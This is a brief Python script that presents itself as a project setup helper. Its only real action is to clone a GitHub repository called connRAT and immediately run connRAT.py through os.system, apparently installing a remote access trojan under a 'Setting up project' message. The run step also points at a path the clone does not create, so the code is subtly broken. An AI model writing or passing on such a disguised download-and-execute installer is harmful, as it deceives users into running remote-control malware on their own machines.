import os
import sys
import time

def download():
  print("Setting up project please wait...")
  try:
     os.system("git clone https://github.com/Rayan25062011/connRAT")
     os.system("python3 connRAT.py")
     print("Setup complete!")
  except:
    print("Setup failed!")
    sys.exit()
download()
